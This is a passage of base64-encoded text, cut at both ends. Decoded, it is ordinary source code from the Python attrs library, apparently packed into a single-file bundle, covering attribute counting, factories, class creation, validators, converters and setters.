G4pXG5cblxuY2xhc3MgX0NvdW50aW5nQXR0cihvYmplY3QpOlxuICAgICIiIlxuICAgIEludGVybWVkaWF0ZSByZXByZXNlbnRhdGlvbiBvZiBhdHRyaWJ1dGVzIHRoYXQgdXNlcyBhIGNvdW50ZXIgdG8gcHJlc2VydmVcbiAgICB0aGUgb3JkZXIgaW4gd2hpY2ggdGhlIGF0dHJpYnV0ZXMgaGF2ZSBiZWVuIGRlZmluZWQuXG5cbiAgICAqSW50ZXJuYWwqIGRhdGEgc3RydWN0dXJlIG9mIHRoZSBhdHRycyBsaWJyYXJ5LiAgUnVubmluZyBpbnRvIGlzIG1vc3RcbiAgICBsaWtlbHkgdGhlIHJlc3VsdCBvZiBhIGJ1ZyBsaWtlIGEgZm9yZ290dGVuIGBAYXR0ci5zYCBkZWNvcmF0b3IuXG4gICAgIiIiXG5cbiAgICBfX3Nsb3RzX18gPSAoXG4gICAgICAgICJjb3VudGVyIixcbiAgICAgICAgIl9kZWZhdWx0IixcbiAgICAgICAgInJlcHIiLFxuICAgICAgICAiZXEiLFxuICAgICAgICAiZXFfa2V5IixcbiAgICAgICAgIm9yZGVyIixcbiAgICAgICAgIm9yZGVyX2tleSIsXG4gICAgICAgICJoYXNoIixcbiAgICAgICAgImluaXQiLFxuICAgICAgICAibWV0YWRhdGEiLFxuICAgICAgICAiX3ZhbGlkYXRvciIsXG4gICAgICAgICJjb252ZXJ0ZXIiLFxuICAgICAgICAidHlwZSIsXG4gICAgICAgICJrd19vbmx5IixcbiAgICAgICAgIm9uX3NldGF0dHIiLFxuICAgIClcbiAgICBfX2F0dHJzX2F0dHJzX18gPSB0dXBsZShcbiAgICAgICAgQXR0cmlidXRlKFxuICAgICAgICAgICAgbmFtZT1uYW1lLFxuICAgICAgICAgICAgZGVmYXVsdD1OT1RISU5HLFxuICAgICAgICAgICAgdmFsaWRhdG9yPU5vbmUsXG4gICAgICAgICAgICByZXByPVRydWUsXG4gICAgICAgICAgICBjbXA9Tm9uZSxcbiAgICAgICAgICAgIGhhc2g9VHJ1ZSxcbiAgICAgICAgICAgIGluaXQ9VHJ1ZSxcbiAgICAgICAgICAgIGt3X29ubHk9RmFsc2UsXG4gICAgICAgICAgICBlcT1UcnVlLFxuICAgICAgICAgICAgZXFfa2V5PU5vbmUsXG4gICAgICAgICAgICBvcmRlcj1GYWxzZSxcbiAgICAgICAgICAgIG9yZGVyX2tleT1Ob25lLFxuICAgICAgICAgICAgaW5oZXJpdGVkPUZhbHNlLFxuICAgICAgICAgICAgb25fc2V0YXR0cj1Ob25lLFxuICAgICAgICApXG4gICAgICAgIGZvciBuYW1lIGluIChcbiAgICAgICAgICAgICJjb3VudGVyIixcbiAgICAgICAgICAgICJfZGVmYXVsdCIsXG4gICAgICAgICAgICAicmVwciIsXG4gICAgICAgICAgICAiZXEiLFxuICAgICAgICAgICAgIm9yZGVyIixcbiAgICAgICAgICAgICJoYXNoIixcbiAgICAgICAgICAgICJpbml0IixcbiAgICAgICAgICAgICJvbl9zZXRhdHRyIixcbiAgICAgICAgKVxuICAgICkgKyAoXG4gICAgICAgIEF0dHJpYnV0ZShcbiAgICAgICAgICAgIG5hbWU9Im1ldGFkYXRhIixcbiAgICAgICAgICAgIGRlZmF1bHQ9Tm9uZSxcbiAgICAgICAgICAgIHZhbGlkYXRvcj1Ob25lLFxuICAgICAgICAgICAgcmVwcj1UcnVlLFxuICAgICAgICAgICAgY21wPU5vbmUsXG4gICAgICAgICAgICBoYXNoPUZhbHNlLFxuICAgICAgICAgICAgaW5pdD1UcnVlLFxuICAgICAgICAgICAga3dfb25seT1GYWxzZSxcbiAgICAgICAgICAgIGVxPVRydWUsXG4gICAgICAgICAgICBlcV9rZXk9Tm9uZSxcbiAgICAgICAgICAgIG9yZGVyPUZhbHNlLFxuICAgICAgICAgICAgb3JkZXJfa2V5PU5vbmUsXG4gICAgICAgICAgICBpbmhlcml0ZWQ9RmFsc2UsXG4gICAgICAgICAgICBvbl9zZXRhdHRyPU5vbmUsXG4gICAgICAgICksXG4gICAgKVxuICAgIGNsc19jb3VudGVyID0gMFxuXG4gICAgZGVmIF9faW5pdF9fKFxuICAgICAgICBzZWxmLFxuICAgICAgICBkZWZhdWx0LFxuICAgICAgICB2YWxpZGF0b3IsXG4gICAgICAgIHJlcHIsXG4gICAgICAgIGNtcCxcbiAgICAgICAgaGFzaCxcbiAgICAgICAgaW5pdCxcbiAgICAgICAgY29udmVydGVyLFxuICAgICAgICBtZXRhZGF0YSxcbiAgICAgICAgdHlwZSxcbiAgICAgICAga3dfb25seSxcbiAgICAgICAgZXEsXG4gICAgICAgIGVxX2tleSxcbiAgICAgICAgb3JkZXIsXG4gICAgICAgIG9yZGVyX2tleSxcbiAgICAgICAgb25fc2V0YXR0cixcbiAgICApOlxuICAgICAgICBfQ291bnRpbmdBdHRyLmNsc19jb3VudGVyICs9IDFcbiAgICAgICAgc2VsZi5jb3VudGVyID0gX0NvdW50aW5nQXR0ci5jbHNfY291bnRlclxuICAgICAgICBzZWxmLl9kZWZhdWx0ID0gZGVmYXVsdFxuICAgICAgICBzZWxmLl92YWxpZGF0b3IgPSB2YWxpZGF0b3JcbiAgICAgICAgc2VsZi5jb252ZXJ0ZXIgPSBjb252ZXJ0ZXJcbiAgICAgICAgc2VsZi5yZXByID0gcmVwclxuICAgICAgICBzZWxmLmVxID0gZXFcbiAgICAgICAgc2VsZi5lcV9rZXkgPSBlcV9rZXlcbiAgICAgICAgc2VsZi5vcmRlciA9IG9yZGVyXG4gICAgICAgIHNlbGYub3JkZXJfa2V5ID0gb3JkZXJfa2V5XG4gICAgICAgIHNlbGYuaGFzaCA9IGhhc2hcbiAgICAgICAgc2VsZi5pbml0ID0gaW5pdFxuICAgICAgICBzZWxmLm1ldGFkYXRhID0gbWV0YWRhdGFcbiAgICAgICAgc2VsZi50eXBlID0gdHlwZVxuICAgICAgICBzZWxmLmt3X29ubHkgPSBrd19vbmx5XG4gICAgICAgIHNlbGYub25fc2V0YXR0ciA9IG9uX3NldGF0dHJcblxuICAgIGRlZiB2YWxpZGF0b3Ioc2VsZiwgbWV0aCk6XG4gICAgICAgICIiIlxuICAgICAgICBEZWNvcmF0b3IgdGhhdCBhZGRzICptZXRoKiB0byB0aGUgbGlzdCBvZiB2YWxpZGF0b3JzLlxuXG4gICAgICAgIFJldHVybnMgKm1ldGgqIHVuY2hhbmdlZC5cblxuICAgICAgICAuLiB2ZXJzaW9uYWRkZWQ6OiAxNy4xLjBcbiAgICAgICAgIiIiXG4gICAgICAgIGlmIHNlbGYuX3ZhbGlkYXRvciBpcyBOb25lOlxuICAgICAgICAgICAgc2VsZi5fdmFsaWRhdG9yID0gbWV0aFxuICAgICAgICBlbHNlOlxuICAgICAgICAgICAgc2VsZi5fdmFsaWRhdG9yID0gYW5kXyhzZWxmLl92YWxpZGF0b3IsIG1ldGgpXG4gICAgICAgIHJldHVybiBtZXRoXG5cbiAgICBkZWYgZGVmYXVsdChzZWxmLCBtZXRoKTpcbiAgICAgICAgIiIiXG4gICAgICAgIERlY29yYXRvciB0aGF0IGFsbG93cyB0byBzZXQgdGhlIGRlZmF1bHQgZm9yIGFuIGF0dHJpYnV0ZS5cblxuICAgICAgICBSZXR1cm5zICptZXRoKiB1bmNoYW5nZWQuXG5cbiAgICAgICAgOnJhaXNlcyBEZWZhdWx0QWxyZWFkeVNldEVycm9yOiBJZiBkZWZhdWx0IGhhcyBiZWVuIHNldCBiZWZvcmUuXG5cbiAgICAgICAgLi4gdmVyc2lvbmFkZGVkOjogMTcuMS4wXG4gICAgICAgICIiIlxuICAgICAgICBpZiBzZWxmLl9kZWZhdWx0IGlzIG5vdCBOT1RISU5HOlxuICAgICAgICAgICAgcmFpc2UgRGVmYXVsdEFscmVhZHlTZXRFcnJvcigpXG5cbiAgICAgICAgc2VsZi5fZGVmYXVsdCA9IEZhY3RvcnkobWV0aCwgdGFrZXNfc2VsZj1UcnVlKVxuXG4gICAgICAgIHJldHVybiBtZXRoXG5cblxuX0NvdW50aW5nQXR0ciA9IF9hZGRfZXEoX2FkZF9yZXByKF9Db3VudGluZ0F0dHIpKVxuXG5cbmNsYXNzIEZhY3Rvcnkob2JqZWN0KTpcbiAgICAiIiJcbiAgICBTdG9yZXMgYSBmYWN0b3J5IGNhbGxhYmxlLlxuXG4gICAgSWYgcGFzc2VkIGFzIHRoZSBkZWZhdWx0IHZhbHVlIHRvIGBhdHRycy5maWVsZGAsIHRoZSBmYWN0b3J5IGlzIHVzZWQgdG9cbiAgICBnZW5lcmF0ZSBhIG5ldyB2YWx1ZS5cblxuICAgIDpwYXJhbSBjYWxsYWJsZSBmYWN0b3J5OiBBIGNhbGxhYmxlIHRoYXQgdGFrZXMgZWl0aGVyIG5vbmUgb3IgZXhhY3RseSBvbmVcbiAgICAgICAgbWFuZGF0b3J5IHBvc2l0aW9uYWwgYXJndW1lbnQgZGVwZW5kaW5nIG9uICp0YWtlc19zZWxmKi5cbiAgICA6cGFyYW0gYm9vbCB0YWtlc19zZWxmOiBQYXNzIHRoZSBwYXJ0aWFsbHkgaW5pdGlhbGl6ZWQgaW5zdGFuY2UgdGhhdCBpc1xuICAgICAgICBiZWluZyBpbml0aWFsaXplZCBhcyBhIHBvc2l0aW9uYWwgYXJndW1lbnQuXG5cbiAgICAuLiB2ZXJzaW9uYWRkZWQ6OiAxNy4xLjAgICp0YWtlc19zZWxmKlxuICAgICIiIlxuXG4gICAgX19zbG90c19fID0gKCJmYWN0b3J5IiwgInRha2VzX3NlbGYiKVxuXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGZhY3RvcnksIHRha2VzX3NlbGY9RmFsc2UpOlxuICAgICAgICAiIiJcbiAgICAgICAgYEZhY3RvcnlgIGlzIHBhcnQgb2YgdGhlIGRlZmF1bHQgbWFjaGluZXJ5IHNvIGlmIHdlIHdhbnQgYSBkZWZhdWx0XG4gICAgICAgIHZhbHVlIGhlcmUsIHdlIGhhdmUgdG8gaW1wbGVtZW50IGl0IG91cnNlbHZlcy5cbiAgICAgICAgIiIiXG4gICAgICAgIHNlbGYuZmFjdG9yeSA9IGZhY3RvcnlcbiAgICAgICAgc2VsZi50YWtlc19zZWxmID0gdGFrZXNfc2VsZlxuXG4gICAgZGVmIF9fZ2V0c3RhdGVfXyhzZWxmKTpcbiAgICAgICAgIiIiXG4gICAgICAgIFBsYXkgbmljZSB3aXRoIHBpY2tsZS5cbiAgICAgICAgIiIiXG4gICAgICAgIHJldHVybiB0dXBsZShnZXRhdHRyKHNlbGYsIG5hbWUpIGZvciBuYW1lIGluIHNlbGYuX19zbG90c19fKVxuXG4gICAgZGVmIF9fc2V0c3RhdGVfXyhzZWxmLCBzdGF0ZSk6XG4gICAgICAgICIiIlxuICAgICAgICBQbGF5IG5pY2Ugd2l0aCBwaWNrbGUuXG4gICAgICAgICIiIlxuICAgICAgICBmb3IgbmFtZSwgdmFsdWUgaW4gemlwKHNlbGYuX19zbG90c19fLCBzdGF0ZSk6XG4gICAgICAgICAgICBzZXRhdHRyKHNlbGYsIG5hbWUsIHZhbHVlKVxuXG5cbl9mID0gW1xuICAgIEF0dHJpYnV0ZShcbiAgICAgICAgbmFtZT1uYW1lLFxuICAgICAgICBkZWZhdWx0PU5PVEhJTkcsXG4gICAgICAgIHZhbGlkYXRvcj1Ob25lLFxuICAgICAgICByZXByPVRydWUsXG4gICAgICAgIGNtcD1Ob25lLFxuICAgICAgICBlcT1UcnVlLFxuICAgICAgICBvcmRlcj1GYWxzZSxcbiAgICAgICAgaGFzaD1UcnVlLFxuICAgICAgICBpbml0PVRydWUsXG4gICAgICAgIGluaGVyaXRlZD1GYWxzZSxcbiAgICApXG4gICAgZm9yIG5hbWUgaW4gRmFjdG9yeS5fX3Nsb3RzX19cbl1cblxuRmFjdG9yeSA9IF9hZGRfaGFzaChfYWRkX2VxKF9hZGRfcmVwcihGYWN0b3J5LCBhdHRycz1fZiksIGF0dHJzPV9mKSwgYXR0cnM9X2YpXG5cblxuZGVmIG1ha2VfY2xhc3MobmFtZSwgYXR0cnMsIGJhc2VzPShvYmplY3QsKSwgKiphdHRyaWJ1dGVzX2FyZ3VtZW50cyk6XG4gICAgIiIiXG4gICAgQSBxdWljayB3YXkgdG8gY3JlYXRlIGEgbmV3IGNsYXNzIGNhbGxlZCAqbmFtZSogd2l0aCAqYXR0cnMqLlxuXG4gICAgOnBhcmFtIHN0ciBuYW1lOiBUaGUgbmFtZSBmb3IgdGhlIG5ldyBjbGFzcy5cblxuICAgIDpwYXJhbSBhdHRyczogQSBsaXN0IG9mIG5hbWVzIG9yIGEgZGljdGlvbmFyeSBvZiBtYXBwaW5ncyBvZiBuYW1lcyB0b1xuICAgICAgICBhdHRyaWJ1dGVzLlxuXG4gICAgICAgIElmICphdHRycyogaXMgYSBsaXN0IG9yIGFuIG9yZGVyZWQgZGljdCAoYGRpY3RgIG9uIFB5dGhvbiAzLjYrLFxuICAgICAgICBgY29sbGVjdGlvbnMuT3JkZXJlZERpY3RgIG90aGVyd2lzZSksIHRoZSBvcmRlciBpcyBkZWR1Y2VkIGZyb21cbiAgICAgICAgdGhlIG9yZGVyIG9mIHRoZSBuYW1lcyBvciBhdHRyaWJ1dGVzIGluc2lkZSAqYXR0cnMqLiAgT3RoZXJ3aXNlIHRoZVxuICAgICAgICBvcmRlciBvZiB0aGUgZGVmaW5pdGlvbiBvZiB0aGUgYXR0cmlidXRlcyBpcyB1c2VkLlxuICAgIDp0eXBlIGF0dHJzOiBgbGlzdGAgb3IgYGRpY3RgXG5cbiAgICA6cGFyYW0gdHVwbGUgYmFzZXM6IENsYXNzZXMgdGhhdCB0aGUgbmV3IGNsYXNzIHdpbGwgc3ViY2xhc3MuXG5cbiAgICA6cGFyYW0gYXR0cmlidXRlc19hcmd1bWVudHM6IFBhc3NlZCB1bm1vZGlmaWVkIHRvIGBhdHRyLnNgLlxuXG4gICAgOnJldHVybjogQSBuZXcgY2xhc3Mgd2l0aCAqYXR0cnMqLlxuICAgIDpydHlwZTogdHlwZVxuXG4gICAgLi4gdmVyc2lvbmFkZGVkOjogMTcuMS4wICpiYXNlcypcbiAgICAuLiB2ZXJzaW9uY2hhbmdlZDo6IDE4LjEuMCBJZiAqYXR0cnMqIGlzIG9yZGVyZWQsIHRoZSBvcmRlciBpcyByZXRhaW5lZC5cbiAgICAiIiJcbiAgICBpZiBpc2luc3RhbmNlKGF0dHJzLCBkaWN0KTpcbiAgICAgICAgY2xzX2RpY3QgPSBhdHRyc1xuICAgIGVsaWYgaXNpbnN0YW5jZShhdHRycywgKGxpc3QsIHR1cGxlKSk6XG4gICAgICAgIGNsc19kaWN0ID0gZGljdCgoYSwgYXR0cmliKCkpIGZvciBhIGluIGF0dHJzKVxuICAgIGVsc2U6XG4gICAgICAgIHJhaXNlIFR5cGVFcnJvcigiYXR0cnMgYXJndW1lbnQgbXVzdCBiZSBhIGRpY3Qgb3IgYSBsaXN0LiIpXG5cbiAgICBwcmVfaW5pdCA9IGNsc19kaWN0LnBvcCgiX19hdHRyc19wcmVfaW5pdF9fIiwgTm9uZSlcbiAgICBwb3N0X2luaXQgPSBjbHNfZGljdC5wb3AoIl9fYXR0cnNfcG9zdF9pbml0X18iLCBOb25lKVxuICAgIHVzZXJfaW5pdCA9IGNsc19kaWN0LnBvcCgiX19pbml0X18iLCBOb25lKVxuXG4gICAgYm9keSA9IHt9XG4gICAgaWYgcHJlX2luaXQgaXMgbm90IE5vbmU6XG4gICAgICAgIGJvZHlbIl9fYXR0cnNfcHJlX2luaXRfXyJdID0gcHJlX2luaXRcbiAgICBpZiBwb3N0X2luaXQgaXMgbm90IE5vbmU6XG4gICAgICAgIGJvZHlbIl9fYXR0cnNfcG9zdF9pbml0X18iXSA9IHBvc3RfaW5pdFxuICAgIGlmIHVzZXJfaW5pdCBpcyBub3QgTm9uZTpcbiAgICAgICAgYm9keVsiX19pbml0X18iXSA9IHVzZXJfaW5pdFxuXG4gICAgdHlwZV8gPSBuZXdfY2xhc3MobmFtZSwgYmFzZXMsIHt9LCBsYW1iZGEgbnM6IG5zLnVwZGF0ZShib2R5KSlcblxuICAgICMgRm9yIHBpY2tsaW5nIHRvIHdvcmssIHRoZSBfX21vZHVsZV9fIHZhcmlhYmxlIG5lZWRzIHRvIGJlIHNldCB0byB0aGVcbiAgICAjIGZyYW1lIHdoZXJlIHRoZSBjbGFzcyBpcyBjcmVhdGVkLiAgQnlwYXNzIHRoaXMgc3RlcCBpbiBlbnZpcm9ubWVudHMgd2hlcmVcbiAgICAjIHN5cy5fZ2V0ZnJhbWUgaXMgbm90IGRlZmluZWQgKEp5dGhvbiBmb3IgZXhhbXBsZSkgb3Igc3lzLl9nZXRmcmFtZSBpcyBub3RcbiAgICAjIGRlZmluZWQgZm9yIGFyZ3VtZW50cyBncmVhdGVyIHRoYW4gMCAoSXJvblB5dGhvbikuXG4gICAgdHJ5OlxuICAgICAgICB0eXBlXy5fX21vZHVsZV9fID0gc3lzLl9nZXRmcmFtZSgxKS5mX2dsb2JhbHMuZ2V0KFxuICAgICAgICAgICAgIl9fbmFtZV9fIiwgIl9fbWFpbl9fIlxuICAgICAgICApXG4gICAgZXhjZXB0IChBdHRyaWJ1dGVFcnJvciwgVmFsdWVFcnJvcik6XG4gICAgICAgIHBhc3NcblxuICAgICMgV2UgZG8gaXQgaGVyZSBmb3IgcHJvcGVyIHdhcm5pbmdzIHdpdGggbWVhbmluZ2Z1bCBzdGFja2xldmVsLlxuICAgIGNtcCA9IGF0dHJpYnV0ZXNfYXJndW1lbnRzLnBvcCgiY21wIiwgTm9uZSlcbiAgICAoXG4gICAgICAgIGF0dHJpYnV0ZXNfYXJndW1lbnRzWyJlcSJdLFxuICAgICAgICBhdHRyaWJ1dGVzX2FyZ3VtZW50c1sib3JkZXIiXSxcbiAgICApID0gX2RldGVybWluZV9hdHRyc19lcV9vcmRlcihcbiAgICAgICAgY21wLFxuICAgICAgICBhdHRyaWJ1dGVzX2FyZ3VtZW50cy5nZXQoImVxIiksXG4gICAgICAgIGF0dHJpYnV0ZXNfYXJndW1lbnRzLmdldCgib3JkZXIiKSxcbiAgICAgICAgVHJ1ZSxcbiAgICApXG5cbiAgICByZXR1cm4gX2F0dHJzKHRoZXNlPWNsc19kaWN0LCAqKmF0dHJpYnV0ZXNfYXJndW1lbnRzKSh0eXBlXylcblxuXG4jIFRoZXNlIGFyZSByZXF1aXJlZCBieSB3aXRoaW4gdGhpcyBtb2R1bGUgc28gd2UgZGVmaW5lIHRoZW0gaGVyZSBhbmQgbWVyZWx5XG4jIGltcG9ydCBpbnRvIC52YWxpZGF0b3JzIC8gLmNvbnZlcnRlcnMuXG5cblxuQGF0dHJzKHNsb3RzPVRydWUsIGhhc2g9VHJ1ZSlcbmNsYXNzIF9BbmRWYWxpZGF0b3Iob2JqZWN0KTpcbiAgICAiIiJcbiAgICBDb21wb3NlIG1hbnkgdmFsaWRhdG9ycyB0byBhIHNpbmdsZSBvbmUuXG4gICAgIiIiXG5cbiAgICBfdmFsaWRhdG9ycyA9IGF0dHJpYigpXG5cbiAgICBkZWYgX19jYWxsX18oc2VsZiwgaW5zdCwgYXR0ciwgdmFsdWUpOlxuICAgICAgICBmb3IgdiBpbiBzZWxmLl92YWxpZGF0b3JzOlxuICAgICAgICAgICAgdihpbnN0LCBhdHRyLCB2YWx1ZSlcblxuXG5kZWYgYW5kXygqdmFsaWRhdG9ycyk6XG4gICAgIiIiXG4gICAgQSB2YWxpZGF0b3IgdGhhdCBjb21wb3NlcyBtdWx0aXBsZSB2YWxpZGF0b3JzIGludG8gb25lLlxuXG4gICAgV2hlbiBjYWxsZWQgb24gYSB2YWx1ZSwgaXQgcnVucyBhbGwgd3JhcHBlZCB2YWxpZGF0b3JzLlxuXG4gICAgOnBhcmFtIGNhbGxhYmxlcyB2YWxpZGF0b3JzOiBBcmJpdHJhcnkgbnVtYmVyIG9mIHZhbGlkYXRvcnMuXG5cbiAgICAuLiB2ZXJzaW9uYWRkZWQ6OiAxNy4xLjBcbiAgICAiIiJcbiAgICB2YWxzID0gW11cbiAgICBmb3IgdmFsaWRhdG9yIGluIHZhbGlkYXRvcnM6XG4gICAgICAgIHZhbHMuZXh0ZW5kKFxuICAgICAgICAgICAgdmFsaWRhdG9yLl92YWxpZGF0b3JzXG4gICAgICAgICAgICBpZiBpc2luc3RhbmNlKHZhbGlkYXRvciwgX0FuZFZhbGlkYXRvcilcbiAgICAgICAgICAgIGVsc2UgW3ZhbGlkYXRvcl1cbiAgICAgICAgKVxuXG4gICAgcmV0dXJuIF9BbmRWYWxpZGF0b3IodHVwbGUodmFscykpXG5cblxuZGVmIHBpcGUoKmNvbnZlcnRlcnMpOlxuICAgICIiIlxuICAgIEEgY29udmVydGVyIHRoYXQgY29tcG9zZXMgbXVsdGlwbGUgY29udmVydGVycyBpbnRvIG9uZS5cblxuICAgIFdoZW4gY2FsbGVkIG9uIGEgdmFsdWUsIGl0IHJ1bnMgYWxsIHdyYXBwZWQgY29udmVydGVycywgcmV0dXJuaW5nIHRoZVxuICAgICpsYXN0KiB2YWx1ZS5cblxuICAgIFR5cGUgYW5ub3RhdGlvbnMgd2lsbCBiZSBpbmZlcnJlZCBmcm9tIHRoZSB3cmFwcGVkIGNvbnZlcnRlcnNcJywgaWZcbiAgICB0aGV5IGhhdmUgYW55LlxuXG4gICAgOnBhcmFtIGNhbGxhYmxlcyBjb252ZXJ0ZXJzOiBBcmJpdHJhcnkgbnVtYmVyIG9mIGNvbnZlcnRlcnMuXG5cbiAgICAuLiB2ZXJzaW9uYWRkZWQ6OiAyMC4xLjBcbiAgICAiIiJcblxuICAgIGRlZiBwaXBlX2NvbnZlcnRlcih2YWwpOlxuICAgICAgICBmb3IgY29udmVydGVyIGluIGNvbnZlcnRlcnM6XG4gICAgICAgICAgICB2YWwgPSBjb252ZXJ0ZXIodmFsKVxuXG4gICAgICAgIHJldHVybiB2YWxcblxuICAgIGlmIG5vdCBQWTI6XG4gICAgICAgIGlmIG5vdCBjb252ZXJ0ZXJzOlxuICAgICAgICAgICAgIyBJZiB0aGUgY29udmVydGVyIGxpc3QgaXMgZW1wdHksIHBpcGVfY29udmVydGVyIGlzIHRoZSBpZGVudGl0eS5cbiAgICAgICAgICAgIEEgPSB0eXBpbmcuVHlwZVZhcigiQSIpXG4gICAgICAgICAgICBwaXBlX2NvbnZlcnRlci5fX2Fubm90YXRpb25zX18gPSB7InZhbCI6IEEsICJyZXR1cm4iOiBBfVxuICAgICAgICBlbHNlOlxuICAgICAgICAgICAgIyBHZXQgcGFyYW1ldGVyIHR5cGUuXG4gICAgICAgICAgICBzaWcgPSBOb25lXG4gICAgICAgICAgICB0cnk6XG4gICAgICAgICAgICAgICAgc2lnID0gaW5zcGVjdC5zaWduYXR1cmUoY29udmVydGVyc1swXSlcbiAgICAgICAgICAgIGV4Y2VwdCAoVmFsdWVFcnJvciwgVHlwZUVycm9yKTogICMgaW5zcGVjdCBmYWlsZWRcbiAgICAgICAgICAgICAgICBwYXNzXG4gICAgICAgICAgICBpZiBzaWc6XG4gICAgICAgICAgICAgICAgcGFyYW1zID0gbGlzdChzaWcucGFyYW1ldGVycy52YWx1ZXMoKSlcbiAgICAgICAgICAgICAgICBpZiAoXG4gICAgICAgICAgICAgICAgICAgIHBhcmFtc1xuICAgICAgICAgICAgICAgICAgICBhbmQgcGFyYW1zWzBdLmFubm90YXRpb24gaXMgbm90IGluc3BlY3QuUGFyYW1ldGVyLmVtcHR5XG4gICAgICAgICAgICAgICAgKTpcbiAgICAgICAgICAgICAgICAgICAgcGlwZV9jb252ZXJ0ZXIuX19hbm5vdGF0aW9uc19fWyJ2YWwiXSA9IHBhcmFtc1tcbiAgICAgICAgICAgICAgICAgICAgICAgIDBcbiAgICAgICAgICAgICAgICAgICAgXS5hbm5vdGF0aW9uXG4gICAgICAgICAgICAjIEdldCByZXR1cm4gdHlwZS5cbiAgICAgICAgICAgIHNpZyA9IE5vbmVcbiAgICAgICAgICAgIHRyeTpcbiAgICAgICAgICAgICAgICBzaWcgPSBpbnNwZWN0LnNpZ25hdHVyZShjb252ZXJ0ZXJzWy0xXSlcbiAgICAgICAgICAgIGV4Y2VwdCAoVmFsdWVFcnJvciwgVHlwZUVycm9yKTogICMgaW5zcGVjdCBmYWlsZWRcbiAgICAgICAgICAgICAgICBwYXNzXG4gICAgICAgICAgICBpZiBzaWcgYW5kIHNpZy5yZXR1cm5fYW5ub3RhdGlvbiBpcyBub3QgaW5zcGVjdC5TaWduYXR1cmUoKS5lbXB0eTpcbiAgICAgICAgICAgICAgICBwaXBlX2NvbnZlcnRlci5fX2Fubm90YXRpb25zX19bXG4gICAgICAgICAgICAgICAgICAgICJyZXR1cm4iXG4gICAgICAgICAgICAgICAgXSA9IHNpZy5yZXR1cm5fYW5ub3RhdGlvblxuXG4gICAgcmV0dXJuIHBpcGVfY29udmVydGVyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnYXR0ci9fY29uZmlnLnB5JywgYicjIFNQRFgtTGljZW5zZS1JZGVudGlmaWVyOiBNSVRcblxuZnJvbSBfX2Z1dHVyZV9fIGltcG9ydCBhYnNvbHV0ZV9pbXBvcnQsIGRpdmlzaW9uLCBwcmludF9mdW5jdGlvblxuXG5cbl9fYWxsX18gPSBbInNldF9ydW5fdmFsaWRhdG9ycyIsICJnZXRfcnVuX3ZhbGlkYXRvcnMiXVxuXG5fcnVuX3ZhbGlkYXRvcnMgPSBUcnVlXG5cblxuZGVmIHNldF9ydW5fdmFsaWRhdG9ycyhydW4pOlxuICAgICIiIlxuICAgIFNldCB3aGV0aGVyIG9yIG5vdCB2YWxpZGF0b3JzIGFyZSBydW4uICBCeSBkZWZhdWx0LCB0aGV5IGFyZSBydW4uXG5cbiAgICAuLiBkZXByZWNhdGVkOjogMjEuMy4wIEl0IHdpbGwgbm90IGJlIHJlbW92ZWQsIGJ1dCBpdCBhbHNvIHdpbGwgbm90IGJlXG4gICAgICAgIG1vdmVkIHRvIG5ldyBgYGF0dHJzYGAgbmFtZXNwYWNlLiBVc2UgYGF0dHJzLnZhbGlkYXRvcnMuc2V0X2Rpc2FibGVkKClgXG4gICAgICAgIGluc3RlYWQuXG4gICAgIiIiXG4gICAgaWYgbm90IGlzaW5zdGFuY2UocnVuLCBib29sKTpcbiAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJcJ3J1blwnIG11c3QgYmUgYm9vbC4iKVxuICAgIGdsb2JhbCBfcnVuX3ZhbGlkYXRvcnNcbiAgICBfcnVuX3ZhbGlkYXRvcnMgPSBydW5cblxuXG5kZWYgZ2V0X3J1bl92YWxpZGF0b3JzKCk6XG4gICAgIiIiXG4gICAgUmV0dXJuIHdoZXRoZXIgb3Igbm90IHZhbGlkYXRvcnMgYXJlIHJ1bi5cblxuICAgIC4uIGRlcHJlY2F0ZWQ6OiAyMS4zLjAgSXQgd2lsbCBub3QgYmUgcmVtb3ZlZCwgYnV0IGl0IGFsc28gd2lsbCBub3QgYmVcbiAgICAgICAgbW92ZWQgdG8gbmV3IGBgYXR0cnNgYCBuYW1lc3BhY2UuIFVzZSBgYXR0cnMudmFsaWRhdG9ycy5nZXRfZGlzYWJsZWQoKWBcbiAgICAgICAgaW5zdGVhZC5cbiAgICAiIiJcbiAgICByZXR1cm4gX3J1bl92YWxpZGF0b3JzXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnYXR0ci9zZXR0ZXJzLnB5JywgYicjIFNQRFgtTGljZW5zZS1JZGVudGlmaWVyOiBNSVRcblxuIiIiXG5Db21tb25seSB1c2VkIGhvb2tzIGZvciBvbl9zZXRhdHRyLlxuIiIiXG5cbmZyb20gX19mdXR1cmVfXyBpbXBvcnQgYWJzb2x1dGVfaW1wb3J0LCBkaXZpc2lvbiwgcHJpbnRfZnVuY3Rpb25cblxuZnJvbSAuIGltcG9ydCBfY29uZmlnXG5mcm9tIC5leGNlcHRpb25zIGltcG9ydCBGcm96ZW5BdHRyaWJ1dGVFcnJvclxuXG5cbmRlZiBwaXBlKCpzZXR0ZXJzKTpcbiAgICAiIiJcbiAgICBSdW4gYWxsICpzZXR0ZXJzKiBhbmQgcmV0dXJuIHRoZSByZXR1cm4gdmFsdWUgb2YgdGhlIGxhc3Qgb25lLlxuXG4gICAgLi4gdmVyc2lvbmFkZGVkOjogMjAuMS4wXG4gICAgIiIiXG5cbiAgICBkZWYgd3JhcHBlZF9waXBlKGluc3RhbmNlLCBhdHRyaWIsIG5ld192YWx1ZSk6XG4gICAgICAgIHJ2ID0gbmV3X3ZhbHVlXG5cbiAgICAgICAgZm9yIHNldHRlciBpbiBzZXR0ZXJzOlxuICAgICAgICAgICAgcnYgPSBzZXR0ZXIoaW5zdGFuY2UsIGF0dHJpYiwgcnYpXG5cbiAgICAgICAgcmV0dXJuIHJ2XG5cbiAgICByZXR1cm4gd3JhcHBlZF9waXBlXG5cblxuZGVmIGZyb3plbihfLCBfXywgX19fKTpcbiAgICAiIiJcbiAgICBQcmV2ZW50IGFuIGF0dHJpYnV0ZSB0byBiZSBtb2RpZmllZC5cblxuICAgIC4uIHZlcnNpb25hZGRlZDo6IDIwLjEuMFxuICAgICIiIlxuICAgIHJhaXNlIEZyb3plbkF0dHJpYnV0ZUVycm9yKClcblxuXG5kZWYgdmFsaWRhdGUoaW5zdGFuY2UsIGF0dHJpYiwgbmV3X3ZhbHVlKTpcbiAgICAiIiJcbiAgICBSdW4gKmF0dHJpYipcJ3MgdmFsaWRhdG9yIG9uICpuZXdfdmFsdWUqIGlmIGl0IGhhcyBvbmUuXG5cbiAgICAuLiB2Z